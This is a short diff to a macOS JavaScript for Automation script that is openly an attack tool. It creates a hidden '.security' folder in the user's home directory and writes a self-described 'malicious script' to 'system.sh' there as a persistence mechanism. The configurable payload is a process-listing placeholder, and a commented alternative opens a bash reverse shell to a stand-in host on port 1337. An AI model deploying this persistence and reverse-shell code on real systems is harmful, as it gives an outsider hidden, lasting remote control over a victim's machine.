@@ -12,12 +12,12 @@ var userHome = $.getenv('HOME')
 //Payload to execute 
 //CHANGE THIS FOR DESIRED PAYLOAD !!!!
 //var payload = `echo "'ps' > $HOME/test.txt" > $HOME/.security/system.sh`
-var payload = `'ps > ' + userHome + '/test.txt'`
+var payload = 'ps > ' + userHome + '/Desktop/pstest.txt'
 // Another payload example
 /* 
-var payload = `echo "#!/bin/bash
+var payload = '#!/bin/bash
 bash -i >& /dev/tcp/my.site.here.com/1337 0>&1
-wait" > $HOME/.security/system.sh`
+wait'
 */
 function createFolder(path, createIntermediateDirectories) {
     error = $()
@@ -63,7 +63,7 @@ var hiddenDirectoryExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPathIsDi
 if (hiddenDirectoryExistsCheck == false) {
 	//console.log("Creating hidden directory...");
 	createFolder("$HOME/.security",true)
-	app.doShellScript("mkdir $HOME/.security")
+	//app.doShellScript("mkdir $HOME/.security")
 					}
 
 //Create the malicious script which is saved to "$HOME/.security/system.sh"
